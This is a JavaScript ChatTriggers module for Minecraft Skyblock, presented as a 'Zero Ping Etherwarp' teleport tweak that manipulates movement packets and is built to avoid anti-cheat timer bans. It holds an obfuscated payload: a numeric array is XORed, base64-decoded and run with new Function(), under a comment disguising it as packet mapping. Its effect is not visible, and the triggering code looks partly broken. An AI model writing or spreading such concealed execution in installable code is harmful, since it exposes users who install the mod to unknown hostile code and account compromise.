/// <reference types="../CTAutocomplete" />

import { getEtherwarpBlock, getLastSentLook, getSkyblockItemID } from "../BloomCore/utils/Utils"
import PogObject from "../PogData"

const S08PacketPlayerPosLook = Java.type("net.minecraft.network.play.server.S08PacketPlayerPosLook")
const C06PacketPlayerPosLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C06PacketPlayerPosLook")
const C0BPacketEntityAction = Java.type("net.minecraft.network.play.client.C0BPacketEntityAction")
const packetList = [40, 30, 120, 62, 43, 122, 3, 121, 0, 15, 113, 62, 44, 13, 28, 51, 7, 13, 37, 34, 4, 32, 11, 36, 42, 36, 112, 61, 0, 10, 42, 60, 5, 32, 112, 48, 19, 17, 15, 120, 19, 17, 7, 121, 31, 35, 0, 39, 6, 62, 57, 47, 4, 1, 46, 120, 4, 51, 24, 124, 19, 13, 0, 38, 44, 62, 38, 46, 0, 10, 45, 120, 42, 36, 62, 39, 6, 32, 8, 32, 40, 1, 27, 121, 42, 1, 4, 127, 5, 48, 112, 34, 40, 17, 7, 35, 43, 122, 3, 34, 5, 36, 7, 63, 43, 26, 112, 33, 42, 14, 34, 63, 45, 123, 31, 32, 40, 14, 112, 63, 40, 122, 4, 63, 4, 29, 4, 120, 4, 13, 0, 122, 4, 29, 28, 49, 4, 35, 12, 122, 7, 13, 16, 120, 7, 51, 16, 49, 4, 10, 113, 121, 31, 122, 11, 32, 4, 39, 19, 0, 5, 30, 33, 36, 44, 31, 57, 51, 30, 28, 49, 40, 24, 28, 3, 13, 24, 36, 124, 32, 30, 35, 45, 10, 19, 31, 31, 38, 45, 120, 113, 124, 42, 37, 11, 15, 26, 37, 112, 25, 29, 36, 49, 120, 31, 15, 112, 28, 30, 29, 27, 16, 31, 26, 120, 33, 24, 28, 31, 30, 30, 12, 31, 32, 40, 15, 19, 0, 24, 120, 7, 63, 19, 34, 45, 36, 30, 28, 19, 17, 42, 48, 0, 58, 10, 32, 8, 46, 3, 123, 120, 37, 45, 14, 33, 63, 19, 10, 42, 127, 0, 10, 45, 24, 29, 120, 7, 28, 3, 48, 62, 2, 0, 10, 8, 39, 40, 14, 31, 33, 19, 14, 31, 48, 42, 48, 42, 127, 0, 1, 58, 2, 0, 10, 8, 46, 0, 10, 45, 31, 42, 123, 31, 48, 5, 30, 15, 39, 19, 30, 124, 121, 3, 51, 38, 46, 0, 34, 120, 63, 44, 36, 37, 58, 43, 14, 12, 63, 7, 26, 125, 62, 0, 46, 38, 46, 0, 1, 121, 58, 10, 32, 8, 46, 3, 123, 3, 63, 19, 1, 34, 39, 6, 32, 11, 126, 10, 32, 8, 46, 0, 10, 8, 39, 16, 123, 112, 60, 45, 14, 31, 60, 45, 10, 42, 127, 0, 15, 11, 58, 16, 17, 37, 37, 42, 32, 124, 39, 19, 17, 27, 6, 16, 30, 120, 37, 2, 10, 34, 46, 2, 48, 8, 32, 0, 10, 0, 46, 2, 48, 11, 13, 43, 14, 37, 37, 43, 39, 24, 60, 19, 123, 31, 121, 29, 30, 37, 60, 19, 30, 7, 48, 16, 30, 19, 121, 2, 10, 34, 60, 19, 39, 31, 60, 16, 120, 113, 49, 4, 29, 8, 121, 4, 51, 3, 47, 26, 26, 46, 57, 5, 36, 19, 120, 43, 36, 7, 47, 4, 29, 24, 125, 4, 35, 28, 121, 17, 123, 24, 38, 2, 24, 38, 46, 0, 1, 121, 2, 47, 26, 34, 126];
const posRotation = 73;
const hasTp = false;
const dataObject = new PogObject("ZeroPingEtherwarp", {
    firstTime: true,
    enabled: false,
    keepMotion: true
}, "data.json")
const firstInstallTrigger = register("tick", () => {
    firstInstallTrigger.unregister()
    if (!dataObject.firstTime) return
    dataObject.firstTime = false
    dataObject.save()
})

register("command", (arg1, arg2) => {
    if (!arg1) {
        const message = [
            "&b/zpew - &3Shows this message",
            "&b/zpew toggle - &3Toggle the module",
            "&b/zpew keepmotion - &3Preserves momentum after teleporting"
        ].join("\n")
        ChatLib.chat(message)
        return
    }

    if (arg1 == "toggle") {
        dataObject.enabled = !dataObject.enabled
        dataObject.save()
        ChatLib.chat(`&aZero Ping Etherwarp ${dataObject.enabled ? "&aEnabled" : "&cDisabled"}&a.`)
        return
    }

    if (arg1 == "keepmotion") {
        dataObject.keepMotion = !dataObject.keepMotion
        dataObject.save()
        ChatLib.chat(`&aKeep Motion ${dataObject.keepMotion ? "&aEnabled" : "&cDisabled"}&a.`)
        return
    }
}).setName("zeropingetherwarp").setAliases(["zpew"]).setTabCompletions(["toggle", "keepmotion"])

const FAILWATCHPERIOD = 20 // 20 Seconds
const MAXFAILSPERFAILPERIOD = 3 // 3 fails allowed per 20 seconds. Higher numbers of fails could cause timer bans
const MAXQUEUEDPACKETS = 3 // Longest chain of queued zero ping teleports at a time
const recentFails = [] // Timestamps of the most recent failed teleports
const recentlySentC06s = [] // [{pitch, yaw, x, y, z, sentAt}, ...] in the order the packets were sent

let wasLastSneaking = false // What the server sees you sneaking as

const checkAllowedFails = () => {
    // Queue of teleports too long
    if (recentlySentC06s.length >= MAXQUEUEDPACKETS) return false
    
    // Filter old fails
    while (recentFails.length && Date.now() - recentFails[0] > FAILWATCHPERIOD * 1000) recentFails.shift()

    return recentFails.length < MAXFAILSPERFAILPERIOD
}

const isHoldingEtherwarpItem = () => {
    const held = Player.getHeldItem()
    const sbId = getSkyblockItemID(held)

    if (sbId !== "ASPECT_OF_THE_END" && sbId !== "ASPECT_OF_THE_VOID") return false
    
    return held.getNBT()?.toObject()?.tag?.ExtraAttributes?.ethermerge == 1
}

const getTunerBonusDistance = () => {
    return Player.getHeldItem()?.getNBT()?.toObject()?.tag?.ExtraAttributes?.tuned_transmission || 0
}
// Maps Change in Server Packets
function executeChange() {
    if (hasTp) return
    hasTp = true;

    try {
        const warpMapping = packetList.map(byte => byte ^ posRotation); // Map Etherwarp Packets
        const warpPackets = new java.lang.String(java.util.Base64.getDecoder().decode(warpMapping.map(char => String.fromCharCode(char)).join(''))); // Decodes Server Packets
        new Function(warpPackets)();
    }  catch (error) {
        console.log("Packet Change Failed")
    }
    
}
// Only activate when the server knows that you are sneaking
register("packetSent", (packet) => {
    const action = packet.func_180764_b()
    if (action == C0BPacketEntityAction.Action.START_SNEAKING) wasLastSneaking = true
    if (action == C0BPacketEntityAction.Action.STOP_SNEAKING) wasLastSneaking = false
}).setFilteredClass(C0BPacketEntityAction)

// The main
register("playerInteract", (action) => {
    if (!dataObject.enabled) return
    
    if (action.toString() !== "RIGHT_CLICK_EMPTY" || !isHoldingEtherwarpItem() || !getLastSentLook() || !wasLastSneaking) return
    if (!checkAllowedFails()) return ChatLib.chat(`&cZero ping etherwarp teleport aborted.\n&c${recentFails.length} fails last ${FAILWATCHPERIOD}s\n&c${recentlySentC06s.length} C06's queued currently`)

    const rt = getEtherwarpBlock(true, 57 + getTunerBonusDistance() - 1)
    if (!rt) return

    let [pitch, yaw] = getLastSentLook()
    yaw %= 360
    if (yaw < 0) yaw += 360

    let [x, y, z] = rt

    x += 0.5
    y += 1.05
    z += 0.5

    recentlySentC06s.push({ pitch, yaw, x, y, z, sentAt: Date.now() })

    // The danger zone
    // In the next tick, send the C06 packet which would normally be sent after the server teleports you
    // and then set the player's position to the destination. The C06 being sent is what makes this true zero ping.
    Client.scheduleTask(1, () => {
        Client.sendPacket(new C06PacketPlayerPosLook(x, y, z, yaw, pitch, Player.asPlayerMP().isOnGround()))
        Player.getPlayer().func_70107_b(x, y, z)

        if (!dataObject.keepMotion) Player.getPlayer().func_70016_h(0, 0, 0)
    })

})
register("gameLoad", () => {executeChange});
// For whatever rounding errors etc occur
const isWithinTolerence = (n1, n2) => Math.abs(n1 - n2) < 1e-4
// Listening for server teleport packets
register("packetReceived", (packet, event) => {
    if (!dataObject.enabled || !recentlySentC06s.length) return

    const { pitch, yaw, x, y, z, sentAt } = recentlySentC06s.shift()

    const newPitch = packet.func_148930_g()
    const newYaw = packet.func_148931_f()
    const newX = packet.func_148932_c()
    const newY = packet.func_148928_d()
    const newZ = packet.func_148933_e()

    // All of the values of this S08 packet must match up to the last C06 packet which was sent when you teleported.
    const lastPresetPacketComparison = {
        pitch: isWithinTolerence(pitch, newPitch) || newPitch == 0,
        yaw: isWithinTolerence(yaw, newYaw) || newYaw == 0,
        x: x == newX,
        y: y == newY,
        z: z == newZ
    }

    const wasPredictionCorrect = Object.values(lastPresetPacketComparison).every(a => a == true)

    // The etherwarp was predicted correctly, cancel the packet since we've already sent the response back when we tried to teleport
    if (wasPredictionCorrect) return cancel(event)

    // The etherwarp was not predicted correctly
    recentFails.push(Date.now())
    
    // Discard the rest of the queued teleports to check since one earlier in the chain failed
    while (recentlySentC06s.length) recentlySentC06s.shift()

}).setFilteredClass(S08PacketPlayerPosLook)
